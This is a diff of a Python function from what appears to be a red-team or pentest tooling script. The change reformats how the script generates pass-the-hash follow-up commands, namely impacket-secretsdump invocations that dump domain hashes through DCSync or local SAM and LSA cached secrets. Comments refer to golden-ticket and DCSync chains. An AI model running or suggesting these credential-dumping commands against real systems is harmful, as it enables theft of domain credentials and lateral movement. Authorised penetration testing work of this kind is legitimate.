@@ -426,15 +426,21 @@ def run(report, store, ui=None):
         # wasted breath - swap to a useful post-Pwn3d hint (dump SAM+SYSTEM
         # for local hashes; LSASecret / cached creds for domain fallback).
         _tgt_is_dc = best_prox >= 1.0
+        # iter-109: whole-URI single-quoting for parity with the rest of the
+        # impacket chain block (R-GOLDEN, R-CONSTRAINED, R-DCSYNC, R-ADMIN-CRED
+        # all quote 'dom/user@target' as one unit). Also switch the -hashes
+        # syntax from ':NT' to the explicit blank-LM 'aad3b4...:NT' used
+        # everywhere else so the emitted commands read uniformly.
+        _r7_hf = f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{h0}'"
         if local_origin:
             _r7_follow = ("# DCSync NOT available with LOCAL SAM hashes; "
                           "gather domain creds first")
         elif _tgt_is_dc:
-            _r7_follow = (f"impacket-secretsdump -hashes :{h0} "
-                          f"{_dom_r7}/'{u}'@{tgt} -just-dc   # if (Pwn3d!)")
+            _r7_follow = (f"impacket-secretsdump {_r7_hf} "
+                          f"'{_dom_r7}/{u}@{tgt}' -just-dc   # if (Pwn3d!)")
         else:
-            _r7_follow = (f"impacket-secretsdump -hashes :{h0} "
-                          f"{_dom_r7}/'{u}'@{tgt}   "
+            _r7_follow = (f"impacket-secretsdump {_r7_hf} "
+                          f"'{_dom_r7}/{u}@{tgt}'   "
                           f"# if (Pwn3d!) - dumps LOCAL SAM + LSA cached "
                           f"secrets; DCSync requires DC target")
         chains.append(Chain("R7", "pass-the-hash", f"PtH -> {tgt}" + (f"  x{n} hashes" if n > 1 else f" ({u})"),
